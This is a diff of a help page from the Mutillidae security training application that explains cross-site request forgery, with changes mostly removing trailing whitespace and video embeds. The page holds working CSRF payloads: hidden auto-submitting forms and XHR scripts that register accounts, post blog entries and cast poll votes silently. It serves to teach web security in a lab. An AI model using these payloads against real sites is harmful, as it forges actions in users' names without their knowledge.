@@ -4,7 +4,7 @@
 			Cross site request forgery may occcur when an attacker is able to run script
 			into a users browser. To forge a legitimate request, the script creates and
 			send the same parameters to the target website that would be sent if the user
-			had submitted the legitimate form themselves. The target website knows the 
+			had submitted the legitimate form themselves. The target website knows the
 			request has come from the users browser but cannot detect that the request was
 			created and sent by a malicious script running in the users browser. As far as
 			the target site can tell, the user submitted the request by using the web site
@@ -14,19 +14,19 @@
 			<br/><br/>
 			<span class="report-header">Discovery Methodology</span>
 			<br/><br/>
-			Check the target website forms for enbedded tokens which when sent along with the 
+			Check the target website forms for enbedded tokens which when sent along with the
 			other parameters on the form make each request unique. The token could be a random
-			string, some form of CAPTCHA, random math problem, or other way to "sign" each 
+			string, some form of CAPTCHA, random math problem, or other way to "sign" each
 			form in order to be able to identify the form later. If
 			these tokens exists, they provide a method by which the target website can
 			detect a forged request (which would not contain the token issued by the target
-			web site). If the tokens are missing, the request is likely vulnerable to 
+			web site). If the tokens are missing, the request is likely vulnerable to
 			cross site request forgery.
 			<br/><br/>
 			<span class="report-header">Exploitation</span>
 			<br/><br/>
-			Submit the legitimate form and carefully note each parameter and value that 
-			must be sent for the server to process the request successfully. Either 
+			Submit the legitimate form and carefully note each parameter and value that
+			must be sent for the server to process the request successfully. Either
 			generate HTML or create a JavaScript that will send the same parameters
 			to the same target site when the user triggers the "sending event". Next
 			create a "sending event" which will cause the users browser to run the HTML
@@ -34,9 +34,9 @@
 			as a hidden form that is submitted when the user visits a page (onload), hovers
 			over a particular object (onmouseover), or click on a certain area (onclick).
 			The method used is not important as long as the parameters needed by the target
-			site are submitted. 
+			site are submitted.
 			<br/><br/>
-			Note: If the target site requires authentication, the 
+			Note: If the target site requires authentication, the
 			submission will only be successful if the user is still logged into the target
 			site. There is no need they actually being viewing the site. They just need
 			have a valid session token. The browser will send the session token
@@ -45,9 +45,9 @@
 			<span class="report-header">Examples</span>
 			<br/><br/>
 			Virtually all pages are vulnerable although not all pages contain transactions
-			and not all transactions are sensitive. Possibilities include adding a blog 
+			and not all transactions are sensitive. Possibilities include adding a blog
 			entry for the current user without them having to visit
-			the &quot;Add Blog&quot; page or registering a new account of your choice by having 
+			the &quot;Add Blog&quot; page or registering a new account of your choice by having
 			the user visit an infected page.
 			<br/><br/>
 			Lets assume that adding a new user account to Mutillidae is a sensitive transaction.
@@ -60,7 +60,7 @@
 			<br/><br/>
 <code>
 <span class="important-code">POST /index.php?page=register.php</span> HTTP/1.1
-    
+
 Host: mutillidae
 User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.11) Gecko/20101013 Ubuntu/9.04 (jaunty) Firefox/3.6.11
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -83,11 +83,11 @@ username=username1&amp;;password=pass1&amp;confirm_password=pass1&amp;my_signatu
 			<br/>
 <code>
 &lt;!--/*
-Be careful to escape single-quotes if inserting into MySQL. 
+Be careful to escape single-quotes if inserting into MySQL.
 This example has the single quotes MySQL escaped (&#39; -&gt; \&#39;).
-The try/catch is just to help you debug. This is not intended 
+The try/catch is just to help you debug. This is not intended
 to be used when pen testing because if the exploit fails the user
-is going to be notified. 
+is going to be notified.
 */--&gt;
 &lt;form id=&quot;CSRF&quot; method=&quot;POST&quot; action=&quot;/index.php?page=register.php&quot;&gt;
 	&lt;input name=&quot;username&quot; 				value=&quot;sammy&quot; type=&quot;hidden&quot; /&gt;
@@ -99,8 +99,8 @@ is going to be notified.
 &lt;span onmouseover=&quot;try{var lURL=document.location.href;document.getElementById(\&#39;CSRF\&#39;).submit();document.location.href=lURL;}catch(e){alert(e.message);}&quot;&gt;Hello World&lt;/span&gt;
 </code>
 			<br/>
-			On the Add to your Blog page (http://mutillidae/index.php?page=add-to-your-blog.php), 
-			inject this exploit as a new blog. On either the Add Blog or the View Blog page, carefully 
+			On the Add to your Blog page (http://mutillidae/index.php?page=add-to-your-blog.php),
+			inject this exploit as a new blog. On either the Add Blog or the View Blog page, carefully
 			mouseover the blog text and watch for the page to reload. Try to log in with the new user. Trap requests with an
 			interception proxy like Burp to watch the actual request. Submit the request with XHR to get rid
 			of that pesky page reload which could alert the user. When using XHR, use an interception
@@ -131,18 +131,18 @@ is going to be notified.
 	f.method = &quot;POST&quot;;
 	f.action = &quot;./index.php?page=add-to-your-blog.php&quot;;
 	document.body.appendChild(f);
-	
+
 	var e = document.createElement(&quot;input&quot;);
 	e.setAttribute(&quot;type&quot;, &quot;hidden&quot;);
 	e.setAttribute(&quot;name&quot;, &quot;csrf-token&quot;);
 	e.setAttribute(&quot;value&quot;, &quot;SecurityIsDisabled&quot;);
 	f.appendChild(e);
-	
+
 	var e = document.createElement(&quot;input&quot;);
 	e.setAttribute(&quot;type&quot;, &quot;hidden&quot;);
 	e.setAttribute(&quot;name&quot;, &quot;blog_entry&quot;);
 	e.setAttribute(&quot;value&quot;, &quot;this is an auto message!&quot;);
-	f.appendChild(e); 
+	f.appendChild(e);
 
 	var e = document.createElement(&quot;input&quot;);
 	e.setAttribute(&quot;type&quot;, &quot;hidden&quot;);
@@ -158,17 +158,17 @@ is going to be notified.
     		<br/><br/>
 <code>
 &lt;script&gt;
-	var lXMLHTTP; 
+	var lXMLHTTP;
 	try{
 		var lBlogEntry = encodeURI(&quot;BLOG_ENTRY_GOES_HERE&quot;);
-		
+
 		var lData = &quot;csrf-token=&amp;blog_entry=&quot;+lBlogEntry+&quot;&amp;add-to-your-blog-php-submit-button=Save+Blog+Entry&quot;;
 		var lAction = &quot;./index.php?page=add-to-your-blog.php&quot;;
 		var lMethod = &quot;POST&quot;;
 
 		try {
 			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
-		}catch(e){ 
+		}catch(e){
 			try {
 				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
 			}catch(e){
@@ -185,7 +185,7 @@ is going to be notified.
 				alert(&quot;CSRF Complete&quot;);
 			}
 		};
-		
+
 		lXMLHTTP.open(lMethod, lAction, true);
 		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
 		lXMLHTTP.send(lData);
@@ -199,7 +199,7 @@ is going to be notified.
     		<br/><br/>
 <code>
 &lt;script&gt;
-	var lXMLHTTP; 
+	var lXMLHTTP;
 	try{
 		var lUsername = &quot;&lt;USERNAME GOES HERE&gt;&quot;;
 		var lPassword = &quot;&lt;PASSWORD GOES HERE&gt;&quot;;
@@ -210,7 +210,7 @@ is going to be notified.
 
 		try {
 			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
-		}catch(e){ 
+		}catch(e){
 			try {
 				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
 			}catch(e){
@@ -227,14 +227,14 @@ is going to be notified.
 				alert(&quot;CSRF Complete&quot;);
 			}
 		};
-		
+
 		lXMLHTTP.open(lMethod, lAction, true);
 		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
 		lXMLHTTP.send(lData);
 	}catch(e){
 		alert(e.message);
 	}
-&lt;/script&gt; 
+&lt;/script&gt;
 </code>
 			<br/><br/>
 			<span class="report-header">Example: Force someone to vote for NMap - HTML injection</span>
@@ -287,7 +287,7 @@ function sendcsrf(){
     		<br/><br/>
 <code>
 &lt;script&gt;
-	var lXMLHTTP; 
+	var lXMLHTTP;
 	try{
 		var lData = &quot;&quot;;
 		var lAction = &quot;./index.php?page=user-poll.php&amp;csrf-token=&amp;choice=nmap&amp;initials=CSRF&amp;user-poll-php-submit-button=Submit+Vote&quot;;
@@ -296,7 +296,7 @@ function sendcsrf(){
 
 		try {
 			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
-		}catch(e){ 
+		}catch(e){
 			try {
 				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
 			}catch(e){
@@ -313,14 +313,14 @@ function sendcsrf(){
 				alert(&quot;CSRF Complete&quot;);
 			}
 		};
-		
+
 		lXMLHTTP.open(lMethod, lAction, true);
 		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
 		lXMLHTTP.send();
 	}catch(e){
 		alert(e.message);
 	}
-&lt;/script&gt; 
+&lt;/script&gt;
 </code>
 <br/><br/>
 <span class="report-header">Appendix - CSRF Template - HTML Form</span>
@@ -336,9 +336,9 @@ function sendcsrf(){
 /* Now choose an event which when triggered will submit the form. Here are some examples */
 &lt;body onload=&#39;window.document.getElementById(&quot;CSRFForm&quot;).submit();&#39;&gt;
 &lt;span onmouseover=&#39;window.document.getElementById(&quot;CSRFForm&quot;).submit();&#39;&gt;Hello World&lt;/span&gt;
-    
+
 /* JavaScript Injection based CSRF template */
-/* NOTE: Script tags are only needed if injection is into HTML context. 
+/* NOTE: Script tags are only needed if injection is into HTML context.
 If injecting into JavaScript context, do not include script tags. */
 &lt;script&gt;
   	var lCSRFForm = window.document.createElement(&quot;form&quot;);
@@ -368,7 +368,7 @@ If injecting into JavaScript context, do not include script tags. */
 		var lMethod = &quot;$REQUEST-METHOD-HERE$&quot;;
 		try {
 			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
-		}catch (e) { 
+		}catch (e) {
 			try {
 				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
 			}catch (e) {
@@ -405,11 +405,5 @@ If injecting into JavaScript context, do not include script tags. */
 </code>
 <br/><br/>
 <span id="videos" class="report-header">Videos</span>
-<br/><br/>	
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingExplainedPart1TheBasics);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingExplainedPart2DOMBasedXSS);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingExplainedPart3ReflectedXSS);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingExplainedPart4StoredXSS);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteRequestForgeryExplainedPart1BasicCSRF);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteRequestForgeryExplainedPart2AdvancedCSRF);?>
-<br/><br/>	
+<br/><br/>
+<br/><br/>
